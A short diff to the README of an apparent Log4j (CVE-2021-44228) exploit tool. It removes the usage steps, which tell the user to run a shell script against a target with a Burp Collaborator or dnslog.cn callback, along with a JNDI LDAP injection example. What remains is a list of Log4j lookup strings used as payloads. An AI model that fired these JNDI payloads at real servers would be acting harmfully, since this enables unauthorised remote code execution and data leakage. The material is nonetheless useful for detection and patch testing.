@@ -1,24 +1,3 @@
-# Log4j Exploiter - CVE-2021-44228
-
-## How to Use
-```sh
-bash log4j.sh
-```
-Input your target, then input payload and collab (**burp collaborator** or **dnslog.cn**)
-
-## Dependencies
-+ Curl
-
-## Note
->For payload, fill it with ${jndi:ldap://your_payload
-
-**Example :**
-```
-${jndi:ldap://${sys.os.name}
-```
-
-## Payload List
-```
 ${ctx:loginId}
 ${map:type}
 ${filename}
@@ -66,4 +45,3 @@ ${marker:name}
 ${spring:profiles.active[0]
 ${sys:logPath}
 ${web:rootDir}
-```
